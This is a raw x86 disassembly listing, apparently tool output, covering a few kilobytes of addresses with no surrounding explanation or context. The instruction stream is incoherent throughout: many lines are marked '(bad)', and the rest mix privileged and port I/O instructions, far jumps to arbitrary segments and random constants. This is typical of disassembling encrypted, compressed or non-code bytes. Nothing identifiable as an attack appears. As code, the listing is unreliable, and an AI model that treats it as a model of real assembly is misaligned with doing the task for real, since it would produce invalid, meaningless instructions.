  4077ef:	arpl   si,bp
  4077f1:	mov    WORD PTR [esi+ebp*2-0x46],es
  4077f5:	cmp    al,0x17
  4077f7:	scas   al,BYTE PTR es:[edi]
  4077f8:	fincstp 
  4077fa:	adc    DWORD PTR [edi+0x43591ab1],ebp
  407800:	pushf  
  407801:	ret    
  407802:	and    BYTE PTR [ecx+0x49],dh
  407805:	add    BYTE PTR [edx],ah
  407807:	fisttp QWORD PTR [ecx]
  407809:	js     0x407883
  40780b:	cld    
  40780c:	mov    ah,dl
  40780e:	jmp    0xc0a7e981
  407813:	std    
  407814:	fild   QWORD PTR [eax]
  407816:	loop   0x4077ed
  407818:	fwait
  407819:	es mov eax,ebp
  40781c:	fucomip st,st(1)
  40781e:	enter  0xdacc,0xc9
  407822:	or     BYTE PTR [eax-0x4c],0xa1
  407826:	ficom  WORD PTR [edi]
  407828:	mov    cl,0xca
  40782a:	mov    ebx,0x2253cf97
  40782f:	in     al,0xcc
  407831:	in     al,0x7b
  407833:	adc    BYTE PTR [ebp-0xe3a851f],al
  407839:	es daa 
  40783b:	sbb    ecx,eax
  40783d:	add    dh,ah
  40783f:	cmc    
  407840:	sbb    BYTE PTR [eax-0x70],bh
  407843:	jno    0x4077da
  407845:	mov    bh,0x7d
  407847:	xchg   edi,eax
  407848:	xor    ecx,DWORD PTR [eax+edx*4-0x383d998c]
  40784f:	hlt    
  407850:	lock shr DWORD PTR [ecx],cl
  407853:	gs pop edx
  407855:	push   ebp
  407856:	enter  0x5589,0xe5
  40785a:	jle    0x4078c4
  40785c:	push   edx
  40785d:	jo     0x4077f9
  40785f:	jmp    0x4078af
  407861:	cwde   
  407862:	mov    WORD PTR [edi-0x5c73ea06],cs
  407868:	(bad)  
  407869:	mov    ebp,0xb286cf14
  40786e:	and    DWORD PTR [edi-0x73],ebp
  407871:	in     eax,0x2
  407873:	(bad)  
  407875:	inc    edx
  407876:	pop    edi
  407877:	sbb    ah,BYTE PTR [ebx+esi*4+0x13]
  40787b:	xor    dl,BYTE PTR [ecx]
  40787d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40787e:	jmp    0x36e4:0x82c356a3
  407885:	jns    0x407818
  407887:	jbe    0x407875
  407889:	fwait
  40788a:	push   edi
  40788b:	aaa    
  40788c:	add    DWORD PTR [ebx-0x44ef49d3],eax
  407892:	in     eax,0xfa
  407894:	popa   
  407895:	call   0x6868:0x3f6603b9
  40789c:	or     eax,0x6b20ae34
  4078a1:	popa   
  4078a2:	inc    edx
  4078a3:	ficom  WORD PTR [ecx]
  4078a5:	out    0xc7,eax
  4078a7:	scas   eax,DWORD PTR es:[edi]
  4078a8:	fidivr DWORD PTR [ebp+0x7a]
  4078ab:	sbb    DWORD PTR [ebx-0x47],ebx
  4078ae:	and    al,BYTE PTR [ebx+ecx*1]
  4078b1:	mov    ch,0x77
  4078b3:	(bad)  
  4078b4:	stc    
  4078b5:	icebp  
  4078b6:	mov    cl,0xf2
  4078b8:	scas   al,BYTE PTR es:[edi]
  4078b9:	les    ebp,FWORD PTR [eax-0x36ce5dee]
  4078bf:	cmp    ecx,DWORD PTR [eax+edi*2-0x1e4b7314]
  4078c6:	push   esi
  4078c7:	jae    0x40790b
  4078c9:	mov    BYTE PTR [ecx],bl
  4078cb:	je     0x4078a6
  4078cd:	retf   
  4078ce:	enter  0xf333,0x9
  4078d2:	jge    0x4078fa
  4078d4:	or     BYTE PTR [ecx],ch
  4078d6:	ss adc esi,eax
  4078d9:	test   al,0x12
  4078db:	arpl   WORD PTR [ebx+0x25343df4],si
  4078e1:	xor    BYTE PTR [ecx],ch
  4078e3:	cmc    
  4078e4:	add    eax,0x320c9c4c
  4078e9:	push   edx
  4078ea:	je     0x4078c3
  4078ec:	jb     0x4078ef
  4078ee:	aaa    
  4078ef:	add    esp,DWORD PTR [esi]
  4078f1:	inc    esi
  4078f2:	jmp    0x3e002862
  4078f7:	into   
  4078f8:	mov    eax,0x442b44f7
  4078fd:	push   ebp
  4078fe:	adc    al,0x28
  407900:	dec    ebp
  407901:	add    al,BYTE PTR [ecx]
  407903:	adc    BYTE PTR ds:[edi+eax*1-0x53],bl
  407908:	adc    ebp,edx
  40790a:	adc    eax,0x8e67127a
  40790f:	adc    ch,BYTE PTR [edx+0x7569c098]
  407915:	push   edx
  407916:	mov    ebp,0x8f5fcce6
  40791b:	shl    BYTE PTR [eax+0x16013e4b],0xa9
  407922:	adc    dh,BYTE PTR [ecx-0x2f8ee2d]
  407928:	or     al,0x8f
  40792a:	xchg   DWORD PTR ds:0xdcb90a70,ecx
  407930:	sub    DWORD PTR [ecx+0x6526b416],esp
  407936:	xchg   DWORD PTR [edi],edi
  407938:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407939:	lods   eax,DWORD PTR ds:[esi]
  40793a:	ret    0x4659
  40793d:	push   esi
  40793e:	inc    ecx
  40793f:	outs   dx,DWORD PTR ds:[esi]
  407940:	sub    al,0x8
  407942:	sub    ecx,DWORD PTR fs:[esi-0x34816811]
  407949:	add    al,BYTE PTR [ecx]
  40794b:	add    al,0x68
  40794d:	into   
  40794e:	je     0x407915
  407950:	mov    eax,0xff216a68
  407955:	inc    edx
  407956:	popf   
  407957:	out    0x28,al
  407959:	mov    WORD PTR [edi+0x1a],ss
  40795c:	mov    dl,0xef
  40795e:	ja     0x40797d
  407960:	push   ecx
  407961:	iret   
  407962:	mov    eax,ebp
  407964:	sbb    ecx,DWORD PTR [esi+0x2717bf04]
  40796a:	jnp    0x4079d6
  40796c:	cdq    
  40796d:	jge    0x40796b
  40796f:	jl     0x40798f
  407971:	mov    esi,0xd11f4de2
  407976:	xor    bl,BYTE PTR [eax-0x4a]
  407979:	adc    esi,DWORD PTR [eax+0x3f6ae803]
  40797f:	sub    al,0x5f
  407981:	xchg   esi,eax
  407982:	(bad)  [edx+0x414e6765]
  407988:	repz push es
  40798a:	pop    eax
  40798b:	pop    ss
  40798c:	popf   
  40798d:	inc    edi
  40798e:	stc    
  40798f:	repz pop esp
  407991:	cmc    
  407992:	test   al,0xd6
  407994:	push   ds
  407995:	or     ah,BYTE PTR [ebp-0x68f65515]
  40799b:	dec    ecx
  40799c:	hlt    
  40799d:	fisub  DWORD PTR [edx-0x2e]
  4079a0:	out    0xda,eax
  4079a2:	jo     0x407980
  4079a4:	pop    ebx
  4079a5:	sbb    ebp,DWORD PTR [ebx]
  4079a7:	mov    dh,0x3c
  4079a9:	add    BYTE PTR [eax+0x78],0x72
  4079ad:	mov    al,ch
  4079af:	xor    esi,DWORD PTR [esp+eiz*2+0x27434735]
  4079b6:	mov    dl,0xd7
  4079b8:	sbb    DWORD PTR [ebp+0x19407f05],ecx
  4079be:	xchg   edx,eax
  4079bf:	xlat   BYTE PTR ds:[ebx]
  4079c0:	sub    eax,0x9e61cfe6
  4079c5:	or     eax,0x92aad8e
  4079ca:	dec    ebx
  4079cb:	sbb    eax,0x5f65e54e
  4079d0:	icebp  
  4079d1:	fwait
  4079d2:	outs   dx,DWORD PTR ds:[esi]
  4079d3:	icebp  
  4079d4:	push   ds
  4079d5:	and    eax,0xa4f1db7f
  4079da:	adc    al,0x82
  4079dc:	cdq    
  4079dd:	int3   
  4079de:	loop   0x407975
  4079e0:	jno    0x4079a8
  4079e2:	push   esp
  4079e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4079e4:	stc    
  4079e5:	mov    gs,esp
  4079e7:	aas    
  4079e8:	mov    ebx,0x161b5428
  4079ed:	and    DWORD PTR [ebx-0x4a],esp
  4079f0:	adc    eax,0xbddf9ddf
  4079f5:	fnstenv [ecx+eax*8+0x23116c27]
  4079fc:	xchg   esp,eax
  4079fd:	push   cs
  4079fe:	aam    0xfb
  407a00:	repnz stos DWORD PTR es:[edi],eax
  407a02:	pxor   mm1,QWORD PTR [eax-0x64615e4d]
  407a09:	and    esi,0x28969987
  407a0f:	xchg   ebp,eax
  407a10:	lods   eax,DWORD PTR ds:[esi]
  407a11:	mov    dl,0xf0
  407a13:	pop    ds
  407a14:	outs   dx,BYTE PTR ds:[esi]
  407a15:	fidivr WORD PTR [ebx]
  407a17:	ss adc eax,0x4a3bd25
  407a1d:	push   0xf223a912
  407a22:	adc    bh,BYTE PTR [eax+0x7de8c046]
  407a28:	int3   
  407a29:	xor    al,0x80
  407a2b:	xchg   esp,eax
  407a2c:	mov    ch,0xb4
  407a2e:	mov    eax,0x5a119000
  407a33:	les    ecx,FWORD PTR ds:0xb909544f
  407a39:	shr    BYTE PTR [ebx+ebp*4+0xc],cl
  407a3d:	(bad)  
  407a3e:	sub    edx,DWORD PTR [ecx-0x7a822d06]
  407a44:	mov    eax,ds:0x3f01b822
  407a49:	mov    eax,ds:0x871ee6df
  407a4e:	lock add BYTE PTR [ebp+0x68],0x7b
  407a53:	adc    al,0x17
  407a55:	out    dx,eax
  407a56:	xchg   esi,eax
  407a57:	adc    DWORD PTR [edx-0x69],edi
  407a5a:	cmc    
  407a5b:	mov    eax,ds:0x9f4e97e3
  407a60:	mov    ds:0xe6bfdd67,al
  407a65:	lahf   
  407a66:	mov    BYTE PTR [edi-0x66ffb06e],al
  407a6c:	aaa    
  407a6d:	shr    BYTE PTR [ecx+0x765ab073],1
  407a73:	jae    0x407a74
  407a75:	xchg   BYTE PTR [edi],bh
  407a77:	sub    al,0x5f
  407a79:	lock add DWORD PTR [ecx+ebp*8],ebx
  407a7d:	mov    ebp,ebp
  407a7f:	iret   
  407a80:	xchg   esi,eax
  407a81:	jmp    0x407aa6
  407a83:	or     bh,BYTE PTR [edi]
  407a85:	jno    0x407a2e
  407a87:	hlt    
  407a88:	inc    esp
  407a89:	les    esp,FWORD PTR ds:0x22d1bb49
  407a8f:	dec    edx
  407a90:	pop    edx
  407a91:	jmp    DWORD PTR [ebx+0x4b1a94b]
  407a97:	dec    edi
  407a98:	push   edi
  407a99:	pop    ebp
  407a9a:	add    bh,ch
  407a9c:	rcr    BYTE PTR [ebp+ebp*4+0x48151d12],cl
  407aa3:	and    eax,0x2ef17a81
  407aa8:	fsub   DWORD PTR [ebx+0x1c807147]
  407aae:	mov    dl,0xcd
  407ab0:	and    DWORD PTR [ebp+0x72],esi
  407ab3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407ab4:	xor    al,0x31
  407ab6:	xchg   edi,eax
  407ab7:	mov    esp,0x859b5728
  407abc:	fdiv   DWORD PTR [ecx]
  407abe:	ds rcr ebp,cl
  407ac1:	retf   
  407ac2:	mov    ecx,0xa21ab37e
  407ac7:	fdiv   QWORD PTR ds:0x63058751
  407acd:	rol    BYTE PTR [ebx],0xa8
  407ad0:	cwde   
  407ad1:	lds    esp,FWORD PTR [edx-0x76]
  407ad4:	outs   dx,BYTE PTR ds:[esi]
  407ad5:	outs   dx,BYTE PTR ds:[esi]
  407ad6:	push   edi
  407ad7:	sbb    DWORD PTR [ebp-0x69],edi
  407ada:	rcl    BYTE PTR [edx],1
  407adc:	repz add al,al
  407adf:	or     BYTE PTR [edx+0x7d202cec],dh
  407ae5:	push   0x1e3b1016
  407aea:	or     ah,BYTE PTR [ebp-0x5085f93e]
  407af0:	nop
  407af1:	data16 or al,0xf3
  407af4:	pop    esi
  407af5:	dec    ebx
  407af6:	(bad)  
  407af7:	push   ss
  407af8:	sub    edx,esi
  407afa:	(bad)  
  407afb:	cli    
  407afc:	jp     0x407b19
  407afe:	pop    eax
  407aff:	(bad)  
  407b00:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407b01:	into   
  407b02:	mov    bh,0x56
  407b04:	xor    BYTE PTR [esi+0x3d],ah
  407b07:	imul   esp,edi,0xc7ecdea9
  407b0d:	jno    0x407a9c
  407b0f:	(bad)
  407b13:	cmp    eax,0x85f7c17d
  407b18:	cmp    al,0xdf
  407b1a:	and    eax,0x2cb40382
  407b1f:	cs pop esp
  407b21:	lea    esp,[edx-0x56b69604]
  407b27:	into   
  407b28:	jo     0x407b5a
  407b2a:	add    ecx,DWORD PTR [ecx+eax*4-0x2642ad7f]
  407b31:	sbb    DWORD PTR [edi],ecx
  407b33:	ss clc 
  407b35:	xchg   ebp,eax
  407b36:	push   ebp
  407b37:	mov    ?,WORD PTR [edx]
  407b39:	outs   dx,BYTE PTR ds:[esi]
  407b3a:	xchg   edx,eax
  407b3b:	adc    BYTE PTR [ebx+0x19],ch
  407b3e:	cld    
  407b3f:	xchg   esi,eax
  407b40:	xchg   cl,ch
  407b42:	pop    eax
  407b43:	inc    edx
  407b44:	es addr16 xchg esi,eax
  407b47:	push   es
  407b48:	mov    ch,0xb0
  407b4a:	fwait
  407b4b:	dec    edx
  407b4c:	jmp    0x407b98
  407b4e:	inc    ebp
  407b4f:	ret    
  407b50:	pop    esi
  407b51:	ja     0x407b3a
  407b53:	(bad)  
  407b54:	repz and eax,0xf2af21b3
  407b5a:	mov    ebx,0x8d709053
  407b5f:	dec    edx
  407b60:	and    al,dh
  407b62:	sbb    eax,0x1a6d0041
  407b67:	mov    esp,0x8c64f2b0
  407b6c:	mov    cl,0x38
  407b6e:	out    dx,al
  407b6f:	iret   
  407b70:	enter  0x41ef,0x4e
  407b74:	mov    esp,0xf0634b5d
  407b79:	sbb    BYTE PTR [edi+0x706e123e],ah
  407b7f:	jl     0x407b92
  407b81:	pop    ecx
  407b82:	loope  0x407b1a
  407b84:	cmp    BYTE PTR [edi],cl
  407b86:	stos   DWORD PTR es:[edi],eax
  407b87:	mov    ds:0x256a505f,eax
  407b8c:	pop    edi
  407b8d:	popa   
  407b8e:	fs daa 
  407b90:	into   
  407b91:	dec    ebx
  407b92:	rcl    DWORD PTR [eax-0x2eef50af],cl
  407b98:	jg     0x407bf4
  407b9a:	ins    BYTE PTR es:[di],dx
  407b9c:	imul   edi,DWORD PTR [edi],0x14
  407b9f:	fadd   DWORD PTR [ecx-0x21]
  407ba2:	jl     0x407b85
  407ba4:	dec    eax
  407ba5:	sub    bl,BYTE PTR [ebx+0x589b3451]
  407bab:	test   BYTE PTR [ebp+0x62],bh
  407bae:	out    dx,al
  407baf:	into   
  407bb0:	shl    DWORD PTR [ebp+ebp*1-0x3e626ed3],cl
  407bb7:	out    0x48,al
  407bb9:	add    al,BYTE PTR [edi]
  407bbb:	jnp    0x407be1
  407bbd:	cmp    al,BYTE PTR [ebx-0x29f13574]
  407bc3:	pop    ss
  407bc4:	adc    DWORD PTR [edx+0x1b],esi
  407bc7:	inc    edi
  407bc8:	aad    0xb8
  407bca:	dec    ebp
  407bcb:	and    ebp,DWORD PTR [edx]
  407bcd:	push   esi
  407bce:	mov    al,ds:0xf19232e2
  407bd3:	mov    BYTE PTR [edx-0x12e5f1be],dl
  407bd9:	or     DWORD PTR [ebp+0x18d15cfe],esp
  407bdf:	fst    DWORD PTR [esi+0x51]
  407be2:	jge    0x407b65
  407be4:	ins    BYTE PTR es:[edi],dx
  407be5:	xor    ebx,DWORD PTR [ebx]
  407be7:	in     al,0x39
  407be9:	pushf  
  407bea:	or     al,0x16
  407bec:	inc    ebx
  407bed:	das    
  407bee:	jecxz  0x407bd4
  407bf0:	mov    ch,0x5a
  407bf2:	inc    edx
  407bf3:	in     al,dx
  407bf4:	xchg   ecx,eax
  407bf5:	icebp  
  407bf6:	fmulp  st(5),st
  407bf8:	push   esi
  407bf9:	fcomp  DWORD PTR [edx]
  407bfb:	xchg   ebp,eax
  407bfc:	dec    ebp
  407bfd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407bfe:	imul   ebx,ebp,0x8a65d21a
  407c04:	jno    0x407c2b
  407c06:	pop    ebp
  407c07:	test   al,0x40
  407c09:	xlat   BYTE PTR ds:[ebx]
  407c0a:	xchg   ebp,eax
  407c0b:	jle    0x407c67
  407c0d:	sbb    eax,DWORD PTR [esi+0x47]
  407c10:	aas    
  407c11:	mov    ebx,?
  407c13:	push   edx
  407c14:	sbb    eax,0x9eac2c6d
  407c19:	mov    bh,0xe9
  407c1b:	add    bh,ah
  407c1d:	in     eax,0xec
  407c1f:	test   eax,0x857edadf
  407c24:	fdiv   QWORD PTR [ecx+0x65c693d8]
  407c2a:	mov    esp,0x55f04da3
  407c2f:	mov    ebp,0x512dd69a
  407c34:	popf   
  407c35:	outs   dx,BYTE PTR ds:[esi]
  407c36:	fdivr  st,st(0)
  407c38:	push   0x403cc82a
  407c3d:	jbe    0x407bd6
  407c3f:	xchg   ebx,eax
  407c40:	and    eax,0x180a1819
  407c45:	sbb    eax,0xc80adcd5
  407c4a:	mov    edx,0xbe0818b6
  407c4f:	dec    esp
  407c50:	stos   BYTE PTR es:[edi],al
  407c51:	add    DWORD PTR [edi+esi*4-0x3],ecx
  407c55:	dec    eax
  407c56:	stos   BYTE PTR es:[edi],al
  407c57:	pop    edx
  407c58:	sub    bh,BYTE PTR [ecx]
  407c5a:	jbe    0x407cba
  407c5c:	stos   DWORD PTR es:[edi],eax
  407c5d:	ins    DWORD PTR es:[edi],dx
  407c5e:	adc    esp,0xbba24ed9
  407c64:	and    BYTE PTR [edx],dh
  407c66:	and    BYTE PTR [esi+0x24],al
  407c69:	stc    
  407c6a:	lea    esp,[ebp-0x19d49e65]
  407c70:	pop    esp
  407c71:	adc    eax,0x183e3cf7
  407c76:	lahf   
  407c77:	adc    ebp,DWORD PTR [ecx+0x68]
  407c7a:	gs pop edx
  407c7c:	les    edi,FWORD PTR [ebx-0x5d]
  407c7f:	push   es
  407c80:	cmp    ecx,DWORD PTR [ebp+0x42284409]
  407c86:	mov    eax,ds:0xa0eb1a04
  407c8b:	add    edx,DWORD PTR [edx+0x596acd1a]
  407c91:	stos   DWORD PTR es:[edi],eax
  407c92:	(bad)  
  407c93:	out    0xce,al
  407c95:	push   ds
  407c96:	or     BYTE PTR [ebx+0x7e5589e6],bh
  407c9c:	xlat   BYTE PTR es:[ebx]
  407c9e:	dec    eax
  407c9f:	aam    0x1e
  407ca1:	and    BYTE PTR [ebp-0x7078fcc],bl
  407ca7:	test   BYTE PTR [ebp+ebp*1+0x42dd5389],0x55
  407caf:	stc    
  407cb0:	sbb    esi,DWORD PTR [esi-0x56]
  407cb3:	add    bh,cl
  407cb5:	(bad)  
  407cb6:	cld    
  407cb7:	push   ecx
  407cb8:	push   ss
  407cb9:	popf   
  407cba:	mov    ebx,0x33ac7214
  407cbf:	sbb    BYTE PTR [ebp-0x59],ah
  407cc2:	pusha  
  407cc3:	dec    eax
  407cc4:	arpl   WORD PTR [edx+eiz*8+0x74],bp
  407cc8:	mov    ch,0xb9
  407cca:	xchg   ebp,eax
  407ccb:	in     al,0xed
  407ccd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407cce:	jl     0x407c85
  407cd0:	(bad)  
  407cd1:	into   
  407cd2:	inc    esi
  407cd3:	mov    edx,0xdd15995e
  407cd8:	retf   
  407cd9:	(bad)  
  407cda:	inc    ecx
  407cdb:	inc    edx
  407cdc:	xor    BYTE PTR [ebp+ebx*2+0x3a],ah
  407ce0:	jbe    0x407ca8
  407ce2:	or     edi,edi
  407ce4:	retf   0x50e7
  407ce7:	outs   dx,DWORD PTR ds:[esi]
  407ce8:	iret   
  407ce9:	sub    BYTE PTR [ecx],bh
  407ceb:	shr    DWORD PTR [eax-0x2ab5b195],1
  407cf1:	jg     0x407c75
  407cf3:	(bad)  
  407cf4:	out    dx,al
  407cf5:	clc    
  407cf6:	iret   
  407cf7:	out    0x33,al
  407cf9:	bound  eax,QWORD PTR gs:[edx+0x2c35e4ab]
  407d00:	cmp    eax,0xf24ef873
  407d05:	xor    DWORD PTR ds:0x69fd00ea,ecx
  407d0b:	stos   DWORD PTR es:[edi],eax
  407d0c:	daa    
  407d0d:	pop    ss
  407d0e:	out    dx,al
  407d0f:	mov    WORD PTR ds:0xcf58dbe7,gs
  407d15:	jg     0x407d33
  407d17:	push   es
  407d18:	add    ch,ch
  407d1a:	shr    BYTE PTR gs:[ebx-0x2d],cl
  407d1e:	sbb    al,0x46
  407d20:	jmp    0x407d24
  407d22:	mov    al,0xe4
  407d24:	pop    esi
  407d25:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407d26:	mov    dh,0xe6
  407d28:	inc    ebx
  407d29:	add    DWORD PTR [esi+0x6d1b5c62],esi
  407d2f:	jns    0x407d06
  407d31:	mov    bh,0x5e
  407d33:	arpl   WORD PTR [eax+0x6086ba47],bp
  407d39:	imul   esi,DWORD PTR [ecx],0xffffffdc
  407d3c:	push   ecx
  407d3d:	jne    0x407d1e
  407d3f:	and    eax,0x79c58946
  407d44:	sbb    esi,0xffffffc4
  407d47:	jge    0x407cf2
  407d49:	rcl    DWORD PTR [edi+0x6d],0x3d
  407d4d:	jno    0x407cf7
  407d4f:	outs   dx,BYTE PTR ds:[esi]
  407d50:	rcl    BYTE PTR [esi+0x74815dd7],cl
  407d56:	daa    
  407d57:	mov    edi,0x4f575cb5
  407d5c:	mov    BYTE PTR [ebp-0x2f],bh
  407d5f:	mov    al,0x7e
  407d61:	adc    ecx,DWORD PTR [ebx]
  407d63:	adc    BYTE PTR [edx],dh
  407d65:	jbe    0x407d63
  407d67:	push   es
  407d68:	int    0x99
  407d6a:	sti    
  407d6b:	pop    esi
  407d6c:	(bad)  
  407d6d:	shl    DWORD PTR [ebx+0x64],cl
  407d70:	inc    esp
  407d71:	and    al,0x64
  407d73:	in     eax,dx
  407d74:	add    DWORD PTR [eax],0xa030c125
  407d7a:	xor    ebp,DWORD PTR [esi+0x1fa925a1]
  407d80:	dec    esi
  407d81:	mov    ecx,0x57bf71ae
  407d86:	push   ebp
  407d87:	mov    bl,0x14
  407d89:	mov    al,ds:0x4ed5d40f
  407d8e:	fisubr DWORD PTR [ebp+0x75bf0955]
  407d94:	loope  0x407d54
  407d96:	(bad)  
  407d97:	fidiv  WORD PTR [edi+0xe]
  407d9a:	mov    edi,edi
  407d9c:	arpl   WORD PTR [eax+0x76e3c192],bp
  407da2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407da3:	mov    ebp,0x44bfe160
  407da8:	outs   dx,BYTE PTR ds:[esi]
  407da9:	mov    bl,cl
  407dab:	call   0x4f3f:0x326bc893
  407db2:	hlt    
  407db3:	or     al,0xd8
  407db5:	mov    esi,0xde687324
  407dba:	and    al,0xc3
  407dbc:	push   ebp
  407dbd:	stos   BYTE PTR es:[edi],al
  407dbe:	outs   dx,BYTE PTR cs:[esi]
  407dc0:	shl    DWORD PTR [eax+0x47],cl
  407dc3:	add    ah,bl
  407dc5:	lahf   
  407dc6:	and    al,0x24
  407dc8:	test   al,0x82
  407dca:	sub    al,0xc9
  407dcc:	xor    ah,BYTE PTR [edx+0x168f82e]
  407dd2:	loop   0x407da9
  407dd4:	call   0xb52aa94d
  407dd9:	sub    ebx,DWORD PTR [edx]
  407ddb:	(bad)  
  407ddc:	xchg   esp,eax
  407ddd:	xor    DWORD PTR [ecx-0x29],ecx
  407de0:	cmp    DWORD PTR [eax],ebp
  407de2:	les    esp,FWORD PTR [esi]
  407de4:	sub    ecx,edi
  407de6:	gs hlt 
  407de8:	aad    0xbb
  407dea:	jecxz  0x407d75
  407dec:	mov    dh,0x0
  407dee:	enter  0x5d24,0xa
  407df2:	test   eax,0x7bb28e3f
  407df7:	test   BYTE PTR ds:0xdaff8853,cl
  407dfd:	xor    ebx,ebx
  407dff:	arpl   WORD PTR [edi],bx
  407e01:	sbb    DWORD PTR [eax+ebp*2-0x7a],esi
  407e05:	data16 mov es,WORD PTR [di]
  407e09:	add    eax,0xc882bac5
  407e0e:	addr16 mov al,ds:0x1b79
  407e12:	push   es
  407e13:	les    esi,FWORD PTR [edi+0x15]
  407e16:	xchg   ebx,eax
  407e17:	jp     0x407ddd
  407e19:	push   cs
  407e1a:	jae    0x407e88
  407e1c:	jmp    0x5fe3f93
  407e21:	add    ah,0x2b
  407e24:	xlat   BYTE PTR ds:[ebx]
  407e25:	push   edi
  407e26:	ss cwde 
  407e28:	xor    al,0x76
  407e2a:	or     ah,BYTE PTR [ebx+0x38]
  407e2d:	or     eax,0x1acfae0c
  407e32:	aaa    
  407e33:	mov    ebp,0x11064452
  407e38:	inc    ecx
  407e39:	mov    dx,0xb98b
  407e3d:	pusha  
  407e3e:	repnz sbb al,0x4d
  407e41:	add    ah,BYTE PTR [edi]
  407e43:	cwde   
  407e44:	or     DWORD PTR ds:0xdd7872c4,ebp
  407e4a:	mov    esp,0xe59ee62c
  407e4f:	or     esp,DWORD PTR [edi-0x6d]
  407e52:	jb     0x407e26
  407e54:	push   eax
  407e55:	ret    0x656b
  407e58:	or     eax,0x7f936c0d
  407e5d:	xor    DWORD PTR [ebx],edi
  407e5f:	sbb    BYTE PTR [edi],ch
  407e61:	mov    edx,0x89c78719
  407e66:	xor    ebx,ebx
  407e68:	cmp    eax,0x56299f59
  407e6d:	cmc    
  407e6e:	jle    0x407e8c
  407e70:	outs   dx,BYTE PTR ds:[esi]
  407e71:	mov    eax,ds:0xed59b07
  407e76:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407e77:	clc    
  407e78:	inc    eax
  407e79:	mov    esi,0xbe255566
  407e7e:	sub    DWORD PTR [eax],edi
  407e80:	fdivr  QWORD PTR [ebx-0x53]
  407e83:	iret   
  407e84:	mov    ah,0x84
  407e86:	push   ebp
  407e87:	pop    esi
  407e88:	fnstcw WORD PTR [ecx]
  407e8a:	sti    
  407e8b:	retf   0x689f
  407e8e:	fistp  QWORD PTR [edi]
  407e90:	jmp    0x407e47
  407e92:	sar    DWORD PTR [edi],cl
  407e94:	lods   eax,DWORD PTR ds:[esi]
  407e95:	sbb    BYTE PTR [esi+0x45252723],ah
  407e9b:	mov    ah,BYTE PTR [eax-0x2cd6bfe]
  407ea1:	lahf   
  407ea2:	jbe    0x407e24
  407ea4:	mov    esp,0x7e3c287e
  407ea9:	in     eax,dx
  407eaa:	dec    esp
  407eab:	jne    0x407e31
  407ead:	shr    BYTE PTR ss:[edx-0x656d4368],cl
  407eb4:	mov    edi,0xc142ef77
  407eb9:	add    DWORD PTR [ebp+eiz*8+0x37],ecx
  407ebd:	or     BYTE PTR [ebx],cl
  407ebf:	dec    esp
  407ec0:	mov    WORD PTR [ebx-0x587393d4],ds
  407ec6:	xor    al,BYTE PTR [esi-0x2c2cd369]
  407ecc:	loope  0x407e79
  407ece:	sbb    esp,DWORD PTR [edi+0x79]
  407ed1:	mov    cl,0x6e
  407ed3:	lds    eax,FWORD PTR [esi+0x5e3002d1]
  407ed9:	push   edx
  407eda:	ret    
  407edb:	icebp  
  407edc:	push   esp
  407edd:	jmp    0x4f64:0x285da175
  407ee4:	wbinvd 
  407ee6:	shl    DWORD PTR [edi-0x46],0x6e
  407eea:	daa    
  407eeb:	cmp    eax,0x723de74c
  407ef0:	int3   
  407ef1:	ins    DWORD PTR es:[edi],dx
  407ef2:	fsub   QWORD PTR [ebx]
  407ef4:	lods   eax,DWORD PTR ds:[esi]
  407ef5:	loope  0x407f3d
  407ef7:	pushf  
  407ef8:	push   esp
  407ef9:	pushf  
  407efa:	add    BYTE PTR [edx+0x18ece5f9],dh
  407f00:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407f01:	or     DWORD PTR [edi+0x9e80c9a],edi
  407f07:	push   eax
  407f08:	int    0x16
  407f0a:	adc    ch,ch
  407f0c:	sub    al,0xde
  407f0e:	call   0x15953528
  407f13:	mov    ds:0x6a60fe86,al
  407f18:	fild   WORD PTR [esi-0x76]
  407f1b:	mov    BYTE PTR [esi+0x6f],bh
  407f1e:	shr    BYTE PTR [edi-0x69],0x33
  407f22:	sub    eax,0x23aec2d7
  407f27:	icebp  
  407f28:	push   ebx
  407f29:	into   
  407f2a:	outs   dx,BYTE PTR ds:[esi]
  407f2b:	cmp    esp,DWORD PTR [ebp+0x7e]
  407f2e:	jae    0x407f74
  407f30:	push   ss
  407f31:	sbb    eax,0x33a6756f
  407f36:	int3   
  407f37:	gs ja  0x407edc
  407f3a:	test   eax,0xe6da766b
  407f3f:	adc    DWORD PTR [edx-0x2b],eax
  407f42:	(bad)  
  407f43:	fcompp 
  407f45:	pop    ebp
  407f46:	clc    
  407f47:	gs xchg edx,eax
  407f49:	xchg   edi,edx
  407f4b:	in     eax,dx
  407f4c:	dec    ebp
  407f4d:	test   DWORD PTR [edx],esi
  407f4f:	sbb    ah,0x54
  407f52:	in     eax,dx
  407f53:	push   edi
  407f54:	and    cl,BYTE PTR [ebp-0x53f11571]
  407f5a:	mov    bl,0xbd
  407f5c:	mov    DWORD PTR [eax],esi
  407f5e:	add    bh,bl
  407f60:	je     0x407f20
  407f62:	call   0x730f:0x47f68cea
  407f69:	fst    QWORD PTR [ebp-0x6e]
  407f6c:	add    esi,DWORD PTR ds:0x1927f396
  407f72:	nop
  407f73:	jno    0x407f69
  407f75:	(bad)  
  407f76:	sub    ch,BYTE PTR [ecx]
  407f78:	push   es
  407f79:	jp     0x407ff2
  407f7b:	add    eax,0x8d994a2
  407f80:	sub    BYTE PTR [edi],0xa5
  407f83:	sub    ebp,DWORD PTR [edx+0x75645d0b]
  407f89:	jg     0x407f73
  407f8b:	fdivr  DWORD PTR [ebx+esi*8-0x14]
  407f8f:	out    0x49,eax
  407f91:	mov    edi,0x2656f62b
  407f96:	inc    ebp
  407f97:	mov    eax,0xd9829143
  407f9c:	retf   
  407f9d:	int3   
  407f9e:	dec    ebx
  407f9f:	xrelease xchg BYTE PTR [ebx-0x13],bh
  407fa3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407fa4:	and    BYTE PTR [eax],dl
  407fa6:	test   eax,0x5151854f
  407fab:	dec    eax
  407fac:	pop    edx
  407fad:	arpl   WORD PTR [edi+0x4f806f37],cx
